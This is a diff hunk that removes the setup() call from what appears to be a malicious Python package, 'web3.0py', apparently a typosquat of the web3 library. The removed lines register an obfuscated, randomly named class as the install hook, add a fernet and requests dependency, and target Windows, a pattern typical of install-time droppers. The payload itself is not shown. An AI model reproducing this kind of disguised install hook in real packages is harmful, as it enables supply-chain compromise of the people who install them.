@@ -18,22 +18,5 @@ class eoIiHgeWTfucbOwcRSYvjFeiLYBBTnYgEppoIXyaxLetGCuIpXUQfXGaiCasYKndjbkpaUjQTK
             install.run(self)
 
 
-setup(
-    name="web3.0py",
-    version=VERSION,
-    author="YdkYJnSCzJAblchd",
-    author_email="PPQBTlXhjgSjPyigZK@gmail.com",
-    description=DESCRIPTION,
-    long_description_content_type="text/markdown",
-    long_description=LONG_DESCRIPTION,
-    cmdclass={
-        'install': eoIiHgeWTfucbOwcRSYvjFeiLYBBTnYgEppoIXyaxLetGCuIpXUQfXGaiCasYKndjbkpaUjQTKiYg,
-    },
-    packages=find_packages(),
-    setup_requires=['fernet', 'requests'],
-    keywords=[],
-    classifiers=[
-        "Operating System :: Microsoft :: Windows",
-    ]
-)
+# setup(...) removed                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                   
 
